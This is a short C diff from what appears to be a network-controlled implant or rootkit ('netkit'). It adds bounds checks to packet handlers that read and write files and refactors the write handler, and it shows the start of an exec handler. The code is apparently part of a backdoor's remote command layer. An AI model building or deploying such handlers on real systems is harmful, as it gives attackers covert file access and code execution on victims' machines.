@@ -13,15 +13,30 @@
 #include "../../sys/socket.h"
 #include "../../sys/file.h"
 #include "../../netkit.h"
-#include "../../sys/kernel.h"
+#include "../../sys/symbol.h"
 
 int cmd_handle_file_read(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
+    size_t file_pathlen;
+
+    file_pathlen = strlen(packet->content) + 1;  // includes nullbyte
+    if (file_pathlen > packet->content_len)
+        return -EOVERFLOW;
+
     return file_read(packet->content, res_buf, res_buflen);
 }
 
 int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
 {
+    size_t file_pathlen;
+
+    file_pathlen = strlen(packet->content) + 1;  // includes nullbyte
+    if (file_pathlen > packet->content_len)
+        return -EOVERFLOW;
+
+    return file_write(packet->content, packet->content + file_pathlen, packet->content_len - file_pathlen - 2);
+
+    /*
     size_t file_pathlen;
     struct file *file;
     int retv;
@@ -43,7 +58,7 @@ int cmd_handle_file_write(const packet_req_t *packet, u8 **res_buf, size_t *res_
         return retv;
     }
     
-    return 0;
+    return 0;*/
 }
 
 int cmd_handle_file_exec(const packet_req_t *packet, u8 **res_buf, size_t *res_buflen)
